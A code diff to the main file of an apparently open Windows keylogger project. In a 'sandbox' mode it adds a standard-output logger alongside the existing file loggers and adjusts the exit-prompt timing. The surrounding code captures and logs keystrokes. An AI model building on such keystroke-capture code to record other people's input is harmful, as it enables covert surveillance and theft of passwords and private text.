@@ -3,6 +3,7 @@
 #include "KeycodeMapperUS.h"
 #include "KeystrokeCapturerWindows.h"
 #include "SandboxListener.h"
+#include "StdoutLogger.h"
 #include "WindowHandlerWindows.h"
 
 #include "getopt.h"
@@ -20,8 +21,8 @@ Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
 
 void printSandboxState(Keylogger::SandboxListener* sandbox) {
     while (true) {
-        std::cout << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
-        Sleep(500);
+        std::cout << std::endl << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
+        Sleep(1000);
     }
 }
 
@@ -103,6 +104,7 @@ available keycode maps:\n\
 
     Keylogger::FileLogger loggerBin;
     Keylogger::FileLogger logger;
+    Keylogger::StdoutLogger loggerStdout;
 
     Keylogger::KeystrokeCapturerWindows capturer;
 
@@ -131,6 +133,9 @@ available keycode maps:\n\
     std::thread* thr;
 
     if (sandbox) {
+        loggerStdout.open(mapper);
+        capturer.addLogger(&loggerStdout);
+
         sandboxListener.start(mapper);
         thr = new std::thread(printSandboxState, &sandboxListener);
         capturer.setCallback([&sandboxListener](int keycode, Keylogger::KeyState state) {
